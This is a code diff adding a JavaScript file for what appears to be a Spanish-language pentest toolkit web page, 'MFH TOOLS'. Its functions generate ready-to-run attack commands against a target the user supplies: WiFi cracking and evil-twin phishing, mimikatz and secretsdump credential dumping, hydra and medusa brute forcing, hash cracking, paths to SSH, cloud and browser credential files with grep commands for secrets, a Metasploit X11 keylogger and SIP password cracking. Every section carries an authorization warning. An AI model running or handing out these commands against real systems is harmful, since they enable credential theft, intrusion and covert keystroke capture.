+// ============================================================
+function runWifiScanning() {
+    var iface = ($('wifiIface') ? $('wifiIface').value : '').trim() || 'wlan0';
+    var tool = ($('wifiTool') ? $('wifiTool').value : 'all');
+    setOutput('wifiResult', 'Generando comandos WiFi...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  WIFI SCANNING');
+        lines.push('  Interface: ' + esc(iface));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            bettercap: {n: 'Bettercap', i: 'sudo apt install bettercap', c: ['sudo bettercap -iface ' + iface, 'wifi.recon on', 'wifi.show']},
+            'sparrow-wifi': {n: 'Sparrow-WiFi', i: 'git clone https://github.com/ghostop14/sparrow-wifi', c: ['python3 sparrow-wifi.py']},
+            kismet: {n: 'Kismet', i: 'sudo apt install kismet', c: ['sudo kismet -c ' + iface]},
+            airodump: {n: 'Airodump-ng', i: 'sudo apt install aircrack-ng', c: ['sudo airmon-ng start ' + iface, 'sudo airodump-ng ' + iface + 'mon']},
+            airoplay: {n: 'Aireplay-ng', i: 'sudo apt install aircrack-ng', c: ['sudo aireplay-ng --test ' + iface + 'mon']},
+            wifite: {n: 'Wifite', i: 'git clone https://github.com/derv82/wifite2', c: ['sudo wifite']},
+            wash: {n: 'Wash', i: 'sudo apt install reaver', c: ['sudo wash -i ' + iface + 'mon']},
+            reaver: {n: 'Reaver', i: 'sudo apt install reaver', c: ['sudo reaver -i ' + iface + 'mon -b <BSSID> -vv']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo audita tu propia red o con autorizacion');
+        setOutput('wifiResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// CREDENTIAL DUMPING
+// ============================================================
+function runCredentialDumping() {
+    var target = ($('creddumpTarget') ? $('creddumpTarget').value : '').trim() || '/mnt/win';
+    var tool = ($('creddumpTool') ? $('creddumpTool').value : 'all');
+    setOutput('creddumpResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  OS CREDENTIAL DUMPING');
+        lines.push('  Target: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            samdump2: {n: 'samdump2', i: 'sudo apt install samdump2', c: ['samdump2 ' + target + '/SYSTEM ' + target + '/SAM > hashes.txt']},
+            chntpw: {n: 'chntpw', i: 'sudo apt install chntpw', c: ['chntpw -l ' + target + '/SAM', 'chntpw -i ' + target + '/SAM']},
+            creddump7: {n: 'creddump7', i: 'sudo apt install creddump7', c: ['pwdump.py ' + target + '/SYSTEM ' + target + '/SAM', 'lsadump.py ' + target + '/SYSTEM ' + target + '/SECURITY']},
+            secretsdump: {n: 'secretsdump', i: 'pip install impacket', c: ['secretsdump.py -sam ' + target + '/SAM -system ' + target + '/SYSTEM -security ' + target + '/SECURITY LOCAL']},
+            mimikatz: {n: 'Mimikatz', i: 'Descargar de GitHub', c: ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo extrae credenciales con autorizacion');
+        setOutput('creddumpResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// HASH IDENTIFICATION
+// ============================================================
+function runHashIdentification() {
+    var hash = ($('hashidTarget') ? $('hashidTarget').value : '').trim();
+    var tool = ($('hashidTool') ? $('hashidTool').value : 'all');
+    if (!hash) { setOutput('hashidResult', 'ERROR: ingresa un hash'); return; }
+    setOutput('hashidResult', 'Identificando hash...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  HASH IDENTIFICATION');
+        lines.push('  Hash: ' + esc(hash));
+        lines.push('  Longitud: ' + hash.length + ' caracteres');
+        lines.push(line('=', 50));
+        lines.push('');
+        var detected = 'Desconocido';
+        if (/^\$2[aby]\$/.test(hash)) detected = 'bcrypt';
+        else if (/^\$1\$/.test(hash)) detected = 'MD5 Crypt';
+        else if (/^\$5\$/.test(hash)) detected = 'SHA-256 Crypt';
+        else if (/^\$6\$/.test(hash)) detected = 'SHA-512 Crypt';
+        else if (hash.length === 32) detected = 'MD5 / NTLM / MD4';
+        else if (hash.length === 40) detected = 'SHA-1';
+        else if (hash.length === 64) detected = 'SHA-256';
+        else if (hash.length === 128) detected = 'SHA-512';
+        lines.push('Tipo probable: ' + detected);
+        lines.push('');
+        var allTools = {
+            hashid: {n: 'hashID', i: 'pip install hashid', c: ['hashid \'' + hash + '\'', 'hashid -m \'' + hash + '\'']},
+            'hash-identifier': {n: 'Hash-Identifier', i: 'sudo apt install hash-identifier', c: ['hash-identifier ' + hash]},
+            hashcrack: {n: 'hashcrack', i: 'pip install hashcrack-cli', c: ['hashcrack identify ' + hash]}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('TIP: usa hashid -m para modo hashcat');
+        setOutput('hashidResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// PASSWORD PROFILING
+// ============================================================
+function runWordlistProfiling() {
+    var target = ($('wordlistTarget') ? $('wordlistTarget').value : '').trim();
+    var tool = ($('wordlistTool') ? $('wordlistTool').value : 'all');
+    if (!target) { setOutput('wordlistResult', 'ERROR: ingresa un nombre o URL'); return; }
+    setOutput('wordlistResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  PASSWORD PROFILING');
+        lines.push('  Target: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            bopscrk: {n: 'bopscrk', i: 'pip install bopscrk', c: ['bopscrk -i', 'bopscrk -w "' + target + '" -o bopscrk_wordlist.txt']},
+            cewl: {n: 'CeWL', i: 'sudo apt install cewl', c: ['cewl ' + target + ' -d 3 -m 5 -w cewl_wordlist.txt']},
+            crunch: {n: 'Crunch', i: 'sudo apt install crunch', c: ['crunch 8 8 -f /usr/share/crunch/charset.lst numeric -o numeric.txt']},
+            pack: {n: 'PACK', i: 'git clone https://github.com/iphelix/pack', c: ['python statsgen.py wordlist.txt']},
+            rsmangler: {n: 'RSMangler', i: 'sudo apt install rsmangler', c: ['rsmangler -f base_words.txt -e -a -o mangled.txt']},
+            seclists: {n: 'SecLists', i: 'sudo apt install seclists', c: ['ls /usr/share/seclists/Passwords/']},
+            twofi: {n: 'Twofi', i: 'sudo apt install twofi', c: ['twofi -u ' + target + ' -o twitter_wordlist.txt']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo para auditorias con autorizacion');
+        setOutput('wordlistResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// BRUTE FORCE
+// ============================================================
+function runBruteForce() {
+    var target = ($('bruteforceTarget') ? $('bruteforceTarget').value : '').trim();
+    var service = ($('bruteforceService') ? $('bruteforceService').value : 'ssh');
+    var tool = ($('bruteforceTool') ? $('bruteforceTool').value : 'all');
+    if (!target) { setOutput('bruteforceResult', 'ERROR: ingresa una IP o host'); return; }
+    setOutput('bruteforceResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  BRUTE FORCE');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Servicio: ' + esc(service));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            hydra: {n: 'Hydra', i: 'sudo apt install hydra', c: ['hydra -l admin -P /usr/share/wordlists/rockyou.txt ' + target + ' ' + service, 'hydra -L users.txt -P pass.txt ' + service + '://' + target]},
+            'hydra-gtk': {n: 'Hydra-GTK', i: 'sudo apt install hydra-gtk', c: ['xhydra']},
+            medusa: {n: 'Medusa', i: 'sudo apt install medusa', c: ['medusa -h ' + target + ' -u admin -P /usr/share/wordlists/rockyou.txt -M ' + service]},
+            netexec: {n: 'NetExec', i: 'pip install netexec', c: ['nxc ' + service + ' ' + target + ' -u admin -p password', 'nxc ' + service + ' ' + target + ' -u users.txt -p pass.txt']},
+            ncrack: {n: 'Ncrack', i: 'sudo apt install ncrack', c: ['ncrack -U users.txt -P pass.txt ' + service + '://' + target]},
+            crowbar: {n: 'Crowbar', i: 'sudo apt install crowbar', c: ['crowbar -b rdp -s ' + target + '/32 -u admin -C pass.txt']},
+            cat: {n: 'CAT (Context Application Tool)', i: 'Herramienta manual de pentest web', c: ['python3 cat.py -u http://' + target]}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
+        setOutput('bruteforceResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// PASSWORD CRACKING
+// ============================================================
+function runPasswordCracking() {
+    var target = ($('passcrackTarget') ? $('passcrackTarget').value : '').trim();
+    var type = ($('passcrackType') ? $('passcrackType').value : 'md5');
+    var tool = ($('passcrackTool') ? $('passcrackTool').value : 'all');
+    if (!target) { setOutput('passcrackResult', 'ERROR: ingresa un hash o archivo'); return; }
+    setOutput('passcrackResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  PASSWORD CRACKING');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Tipo: ' + esc(type));
+        lines.push(line('=', 50));
+        lines.push('');
+        var hashcatModes = {md5: '0', ntlm: '1000', sha1: '100', sha256: '1400', bcrypt: '3200'};
+        var allTools = {
+            hashcat: {n: 'Hashcat', i: 'sudo apt install hashcat hashcat-data', c: ['hashcat -m ' + (hashcatModes[type] || '0') + ' -a 0 ' + target + ' /usr/share/wordlists/rockyou.txt', 'hashcat -m ' + (hashcatModes[type] || '0') + ' -a 3 ' + target + ' ?a?a?a?a?a?a']},
+            john: {n: 'John the Ripper', i: 'sudo apt install john john-data', c: ['john --wordlist=/usr/share/wordlists/rockyou.txt ' + target, 'john --format=' + type + ' ' + target + ' --wordlist=rockyou.txt']},
+            fcrackzip: {n: 'fcrackzip', i: 'sudo apt install fcrackzip', c: ['fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ' + target, 'fcrackzip -u -b -c a1 -l 1-6 ' + target]},
+            cmospwd: {n: 'cmospwd', i: 'sudo apt install cmospwd', c: ['cmospwd']},
+            crackle: {n: 'Crackle', i: 'sudo apt install crackle', c: ['crackle -i ' + target, 'crackle -i ' + target + ' -o output']},
+            truecrack: {n: 'Truecrack', i: 'git clone https://github.com/lvaccaro/truecrack', c: ['truecrack -t ' + target + ' -w /usr/share/wordlists/rockyou.txt']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo crackea hashes que te pertenezcan');
+        setOutput('passcrackResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// UNSECURED CREDENTIALS
+// ============================================================
+function runUnsecuredCredentials() {
+    var target = ($('unsecuredTarget') ? $('unsecuredTarget').value : '').trim() || '~/';
+    var category = ($('unsecuredCategory') ? $('unsecuredCategory').value : 'all');
+    setOutput('unsecuredResult', 'Enumerando credenciales...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  UNSECURED CREDENTIALS');
+        lines.push('  Home: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('  Referencia: MITRE ATT&CK T1552');
+        lines.push('');
+        var categories = {
+            ssh: {n: 'SSH Keys', paths: ['~/.ssh/id_rsa', '~/.ssh/id_ed25519', '~/.ssh/authorized_keys'], risk: 'Permisos 0644 en privadas'},
+            cloud: {n: 'Cloud Credentials', paths: ['~/.aws/credentials', '~/.config/gcloud/credentials.db', '~/.kube/config'], risk: 'Acceso a produccion'},
+            history: {n: 'Shell History', paths: ['~/.bash_history', '~/.zsh_history'], risk: 'Passwords en texto plano'},
+            browser: {n: 'Browser', paths: ['~/.mozilla/firefox/*/logins.json', '~/.config/google-chrome/Default/Login Data'], risk: 'Passwords guardados'},
+            keyring: {n: 'Keyring', paths: ['~/.local/share/keyrings/'], risk: 'Descifrado offline'},
+            git: {n: 'Git', paths: ['~/.git-credentials', '~/.gitconfig'], risk: 'Tokens en texto plano'},
+            tokens: {n: 'App Tokens', paths: ['~/.netrc', '~/.npmrc', '~/.config/gh/hosts.yml'], risk: 'Tokens de publicacion'}
+        };
+        var cats = (category === 'all') ? Object.keys(categories) : [category];
+        cats.forEach(function(k) {
+            var c = categories[k];
+            if (!c) return;
+            lines.push('[Tool] ' + c.n);
+            lines.push('   Rutas:');
+            c.paths.forEach(function(p) { lines.push('      ' + p); });
+            lines.push('   WARN: ' + c.risk);
+            lines.push('');
+        });
+        lines.push('Comandos:');
+        lines.push(codeBlock('find ~/.ssh -name "id_*" -type f ! -name "*.pub" -perm /o+r'));
+        lines.push(codeBlock('grep -iE "password|secret|token" ~/.bash_history'));
+        lines.push(codeBlock('ls -la ~/.aws/ ~/.config/gcloud/ ~/.kube/ 2>/dev/null'));
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('WARN: solo enumera sistemas con autorizacion');
+        setOutput('unsecuredResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// WIFI CREDENTIAL ACCESS
+// ============================================================
+function runWifiCredentialAccess() {
+    var target = ($('wificredTarget') ? $('wificredTarget').value : '').trim();
+    var tool = ($('wificredTool') ? $('wificredTool').value : 'all');
+    if (!target) { setOutput('wificredResult', 'ERROR: ingresa un BSSID o ESSID'); return; }
+    setOutput('wificredResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  WIFI CREDENTIAL ACCESS');
+        lines.push('  Target: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            'aircrack-ng': {
+                n: 'Aircrack-ng',
+                i: 'sudo apt install aircrack-ng',
+                c: [
+                    'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b ' + target + ' capture-01.cap',
+                    'aircrack-ng -w wordlist.txt capture-01.cap'
+                ]
+            },
+            'wifi-honey': {
+                n: 'Wifi-honey',
+                i: 'sudo apt install wifi-honey',
+                c: ['wifi-honey ' + target + ' 6 wlan0']
+            },
+            wifiphisher: {
+                n: 'Wifiphisher',
+                i: 'sudo apt install wifiphisher',
+                c: [
+                    'sudo wifiphisher -e "' + target + '" -p firmware-upgrade',
+                    'sudo wifiphisher --essid ' + target + ' -p plugin_update'
+                ]
+            },
+            wifite: {
+                n: 'Wifite',
+                i: 'sudo apt install wifite',
+                c: [
+                    'sudo wifite --bssid ' + target,
+                    'sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt',
+                    'sudo wifite --pmkid'
+                ]
+            },
+            airgeddon: {
+                n: 'Airgeddon',
+                i: 'git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git',
+                c: [
+                    'sudo bash ./airgeddon.sh',
+                    '# Menu interactivo: seleccionar ataque'
+                ]
+            },
+            bully: {
+                n: 'Bully',
+                i: 'sudo apt install bully pixiewps',
+                c: [
+                    'bully wlan0mon -b ' + target + ' -c 6 -d -v 3',
+                    'bully wlan0mon -b ' + target + ' -c 6 -v 3'
+                ]
+            },
+            'fern-wifi-cracker': {
+                n: 'Fern WiFi Cracker',
+                i: 'sudo apt install fern-wifi-cracker',
+                c: [
+                    'sudo fern-wifi-cracker',
+                    '# GUI: Refresh -> Attack'
+                ]
+            },
+            eapmd5pass: {
+                n: 'eapmd5pass',
+                i: 'sudo apt install eapmd5pass',
+                c: [
+                    'eapmd5pass -r capture.pcap -w /usr/share/wordlists/rockyou.txt',
+                    'eapmd5pass -i wlan0 -w wordlist.txt'
+                ]
+            }
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo ataca redes con autorizacion escrita');
+        setOutput('wificredResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// KEYLOGGER
+// ============================================================
+function runKeylogger() {
+    var target = ($('keyloggerTarget') ? $('keyloggerTarget').value : '').trim();
+    var port = ($('keyloggerPort') ? $('keyloggerPort').value : '').trim() || '6000';
+    var timeout = ($('keyloggerTimeout') ? $('keyloggerTimeout').value : '').trim() || '600';
+    if (!target) { setOutput('keyloggerResult', 'ERROR: ingresa una IP objetivo'); return; }
+    setOutput('keyloggerResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  KEYLOGGER (X11 Keyboard Spy)');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Puerto: ' + esc(port));
+        lines.push('  Timeout: ' + esc(timeout) + ' s');
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('[Tool] Xspy via Metasploit');
+        lines.push('   Install: sudo apt install metasploit-framework');
+        lines.push('');
+        lines.push('[Step 1] Scan puerto X11');
+        lines.push(codeBlock('msfconsole'));
+        lines.push(codeBlock('use auxiliary/scanner/x11/open_x11'));
+        lines.push(codeBlock('set rhosts ' + target));
+        lines.push(codeBlock('run'));
+        lines.push('');
+        lines.push('[Step 2] Capturar teclado');
+        lines.push(codeBlock('use auxiliary/gather/x11_keyboard_spy'));
+        lines.push(codeBlock('set rhosts ' + target));
+        lines.push(codeBlock('set rport ' + port));
+        lines.push(codeBlock('set LISTENER_TIMEOUT ' + timeout));
+        lines.push(codeBlock('run'));
+        lines.push('');
+        lines.push('[Notes]');
+        lines.push('   - LISTENER_TIMEOUT 0 = permanente');
+        lines.push('   - PRINTERVAL ajusta el intervalo de salida');
+        lines.push('   - El target debe tener el puerto X11 abierto (6000 por defecto)');
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('WARN: solo monitorea sistemas que te pertenezcan');
+        setOutput('keyloggerResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// VOIP CREDENTIAL ACCESS
+// ============================================================
+function runVoipCredentialAccess() {
+    var target = ($('voipTarget') ? $('voipTarget').value : '').trim();
+    var user = ($('voipUser') ? $('voipUser').value : '').trim();
+    var tool = ($('voipTool') ? $('voipTool').value : 'all');
+    if (!target) { setOutput('voipResult', 'ERROR: ingresa una IP objetivo'); return; }
+    setOutput('voipResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  VOIP CREDENTIAL ACCESS');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Usuario: ' + (esc(user) || 'No especificado'));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            svcrack: {
+                n: 'SVCrack (SIPVicious)',
+                i: 'sudo apt install sipvicious',
+                c: [
+                    'sipvicious_svcrack -u' + (user || '100') + ' -r1-9999 ' + target,
+                    'sipvicious_svcrack -u' + (user || '100') + ' -d dictionary.txt ' + target
+                ]
+            },
+            enumiax: {
+                n: 'Enumiax',
+                i: 'sudo apt install enumiax',
+                c: [
+                    'enumiax ' + target,
+                    'enumiax ' + target + ' -p 4569',
+                    'enumiax -v -o results.txt ' + target
+                ]
+            }
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push('[Flujo recomendado]');
+        lines.push(codeBlock('sipvicious_svmap ' + target));
+        lines.push(codeBlock('sipvicious_svwar -e100-999 ' + target));
+        lines.push(codeBlock('sipvicious_svcrack -u' + (user || '100') + ' -r1-9999 ' + target));
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('WARN: solo ataca sistemas VoIP con autorizacion');
+        setOutput('voipResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// EXPORTAR FUNCIONES GLOBALES
+// ============================================================
+window.showTool = showTool;
+window.downloadTool = downloadTool;
+window.runHostInfo = runHostInfo;
+window.runIdentityInfo = runIdentityInfo;
+window.runNetworkInfo = runNetworkInfo;
+window.runDnsInfo = runDnsInfo;
+window.runWebScanning = runWebScanning;
+window.runVulnScanning = runVulnScanning;
+window.runWebVulnScanning = runWebVulnScanning;
+window.runBluetoothScanning = runBluetoothScanning;
+window.runRadioScanning = runRadioScanning;
+window.runWifiScanning = runWifiScanning;
+window.runCredentialDumping = runCredentialDumping;
+window.runHashIdentification = runHashIdentification;
+window.runWordlistProfiling = runWordlistProfiling;
+window.runBruteForce = runBruteForce;
+window.runPasswordCracking = runPasswordCracking;
+window.runUnsecuredCredentials = runUnsecuredCredentials;
+window.runWifiCredentialAccess = runWifiCredentialAccess;
+window.runKeylogger = runKeylogger;
+window.runVoipCredentialAccess = runVoipCredentialAccess;
+
+// ============================================================
+// INICIALIZACION
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('OK: MFH TOOLS - script-tools.js cargado correctamente');
+    console.log('Tools disponibles: ' + AVAILABLE_TOOLS.length);
+    console.log('Reconocimiento: 10 herramientas');
+    console.log('Acceso con Credenciales: 9 herramientas');
+});
